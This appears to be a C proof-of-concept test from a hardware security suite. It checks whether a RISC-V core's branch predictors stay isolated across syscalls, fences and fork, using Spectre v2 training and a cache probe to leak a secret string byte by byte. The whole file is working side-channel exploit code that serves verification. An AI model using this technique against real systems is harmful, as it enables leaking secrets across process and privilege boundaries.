/**
 * spectre-v2-xctx: cross-context predictor isolation, multi-byte.
 *
 * RAPT_SFENCE_KEEP_STATE resolves to 3 (rapt.svh:96) and no config overrides
 * it, so every predictor init/clear port is tied to 1'b0: sfence.vma, fence,
 * U<->S and mret/sret all leave BTB/TAGE/ITT/LP/RAS intact, and no tag carries
 * ASID or privilege.  This PoC trains the shared ITT entry (32 KiB exact alias,
 * see spectre-v2.c) then crosses a real context boundary before the victim
 * executes:
 *   arm syscall: U->S/M->U round trip via ecall (getpid);
 *   arm fence:   fence + fence.i (drains ordering, must NOT clear BPU);
 *   arm fork:    a separate process trains, the parent triggers (Linux only).
 * Any leak after a boundary proves predictor state is not context-isolated.
 *
 * Multi-byte: the gadget leaks secret_str[leak_index]; the syscall arm walks
 * the secret string and recovers each byte from the probe argmax.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 60
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif
#define TRAIN_ROUNDS 30

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));
static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";
static volatile uint32_t leak_index;

__attribute__((noinline))
static void gadget_secret(void) {
  volatile uint8_t t =
      probe_array[(uintptr_t)(uint8_t)secret_str[leak_index] * SC_PROBE_STRIDE];
  (void)t;
}
__attribute__((noinline))
static void gadget_null(void) {
  volatile uint8_t t = probe_array[0];
  (void)t;
}
__attribute__((noinline))
static void benign(void) { asm volatile("nop"); }

static void *tgt_attack;
static void *tgt_victim;
static sc_alias_t al;

static inline void ctx_syscall(void) {
#if defined(SC_POSIX_OS)
  (void)getpid();
#else
  register long a7 asm("a7") = 172; /* getpid: harmless U->S/M->U round trip */
  register long a0 asm("a0") = 0;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
#endif
}

static void train_attacker(void) {
  for (int t = 0; t < TRAIN_ROUNDS; t++) {
    sc_hist_prime();
    al.a(&tgt_attack);
  }
}

/* One attack/null round pair for a given boundary kind (0=syscall,1=fence). */
static void run_rounds(int kind, sc_score_t *atk, sc_score_t *nul,
                       uint32_t R, const sc_geom_t *g) {
  for (uint32_t r = 0; r < R; r++) {
    for (int arm = 0; arm < 2; arm++) {
      tgt_attack = arm ? (void *)gadget_null : (void *)gadget_secret;
      tgt_victim = (void *)benign;
      sc_evict_capacity(g);
      volatile uint8_t sink = (uint8_t)secret_str[leak_index];
      (void)sink;
      sc_fence();
      sc_hist_prime();
      al.b(&tgt_victim); /* populate victim BTB INDR entry */
      train_attacker();
      if (kind == 0)
        ctx_syscall();
      else {
        sc_fence();
        sc_fence_i();
      }
      sc_hist_prime();
      al.b(&tgt_victim); /* trigger after the boundary */
      sc_fence();
      sc_score_t *s = arm ? nul : atk;
      sc_probe_array(probe_array, g, s, 0x7777 + r + arm);
      s->rounds++;
    }
  }
}

/* Multi-byte recovery over the syscall boundary. */
static int read_byte_syscall(int idx, const sc_geom_t *g, uint32_t tries,
                             uint32_t *score) {
  leak_index = (uint32_t)idx;
  tgt_attack = (void *)gadget_secret;
  tgt_victim = (void *)benign;
  sc_score_t atk;
  sc_score_reset(&atk);
  for (uint32_t t = 0; t < tries; t++) {
    sc_evict_capacity(g);
    volatile uint8_t sink = (uint8_t)secret_str[leak_index];
    (void)sink;
    sc_fence();
    sc_hist_prime();
    al.b(&tgt_victim);
    train_attacker();
    ctx_syscall();
    sc_hist_prime();
    al.b(&tgt_victim);
    sc_fence();
    sc_probe_array(probe_array, g, &atk, 0x51de + t);
    atk.rounds++;
  }
  int best = sc_argmax(&atk);
  *score = atk.hits[best];
  return best;
}

#if defined(__linux__)
#include <sys/wait.h>
static void run_fork(sc_score_t *atk, sc_score_t *nul, uint32_t R,
                     const sc_geom_t *g) {
  for (uint32_t r = 0; r < R; r++) {
    for (int arm = 0; arm < 2; arm++) {
      tgt_attack = arm ? (void *)gadget_null : (void *)gadget_secret;
      tgt_victim = (void *)benign;
      sc_evict_capacity(g);
      volatile uint8_t sink = (uint8_t)secret_str[leak_index];
      (void)sink;
      sc_fence();
      sc_hist_prime();
      al.b(&tgt_victim);
      pid_t pid = fork();
      if (pid == 0) {
        /* Child trains the shared per-hart ITT, then exits.  Mappings are
         * inherited at identical VAs, so the gadget address matches. */
        train_attacker();
        _exit(0);
      }
      if (pid > 0)
        waitpid(pid, NULL, 0);
      sc_hist_prime();
      al.b(&tgt_victim);
      sc_fence();
      sc_score_t *s = arm ? nul : atk;
      sc_probe_array(probe_array, g, s, 0x8888 + r + arm);
      s->rounds++;
    }
  }
}
#endif

static void report_arm(const char *name, sc_score_t *atk, sc_score_t *nul,
                       int pos_ok, int expect, uint32_t R, const sc_geom_t *g) {
  sc_decision_t d = sc_decide(atk, nul, expect, pos_ok);
  printf("[%s] attack=%u/%u null=%u/%u argmax=%d nullmax=%d\n",
         name, (unsigned)atk->hits[expect], (unsigned)R,
         (unsigned)nul->hits[expect], (unsigned)R, d.got, d.nullmax);
  sc_result(name, &d, pos_ok, expect, R, g);
}

int main(void) {
  if (sc_time_selfcheck("spectre-v2-xctx") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-v2-xctx ERROR reason=evict\n");
    return 1;
  }
  if (sc_alias_make(&al, SC_DELTA_ITT, sc_itt_stub, sc_itt_stub_len()) != 0) {
    printf("SCRESULT spectre-v2-xctx SKIP reason=no-alias-arena\n");
    return 0;
  }
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;
  leak_index = 0;
  int expect = (uint8_t)secret_str[0];

  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    gadget_secret();
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0x9999 + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[expect] >= R / 2;

  /* Multi-byte leak across the syscall boundary. */
  uint8_t recovered[SECURITY_SECRET_LEN];
  uint32_t scores[SECURITY_SECRET_LEN];
  int matched = 0;
  printf("[xctx] leaking %d bytes across syscall boundary:\n",
         SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    int got = read_byte_syscall(i, &g, R, &scores[i]);
    recovered[i] = (uint8_t)got;
    int ok = (got == (uint8_t)secret_str[i]);
    matched += ok;
    printf("  [%2d] want=0x%02x got=0x%02x score=%u/%u %s\n",
           i, (uint8_t)secret_str[i], got, (unsigned)scores[i],
           (unsigned)R, ok ? "OK" : "miss");
  }
  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT spectre-v2-xctx-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  printf("[xctx] recovered %d/%d bytes: ", matched, SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    putchar((recovered[i] > 31 && recovered[i] < 127) ? recovered[i] : '?');
  putchar('\n');

  /* Per-arm single-byte verdicts with null arms at byte 0. */
  leak_index = 0;
  sc_score_t a0, n0, a1, n1;
  sc_score_reset(&a0); sc_score_reset(&n0);
  sc_score_reset(&a1); sc_score_reset(&n1);
  run_rounds(0, &a0, &n0, R, &g);
  report_arm("spectre-v2-xctx-syscall", &a0, &n0, pos_ok, expect, R, &g);
  run_rounds(1, &a1, &n1, R, &g);
  report_arm("spectre-v2-xctx-fence", &a1, &n1, pos_ok, expect, R, &g);
#if defined(__linux__)
  sc_score_t a2, n2;
  sc_score_reset(&a2); sc_score_reset(&n2);
  run_fork(&a2, &n2, R, &g);
  report_arm("spectre-v2-xctx-fork", &a2, &n2, pos_ok, expect, R, &g);
#else
  printf("SCRESULT spectre-v2-xctx-fork SKIP reason=linux-only\n");
#endif
  if (!pos_ok)
    printf("[xctx] INCONCLUSIVE: positive control failed\n");
  sc_alias_free(&al);
  return 0;
}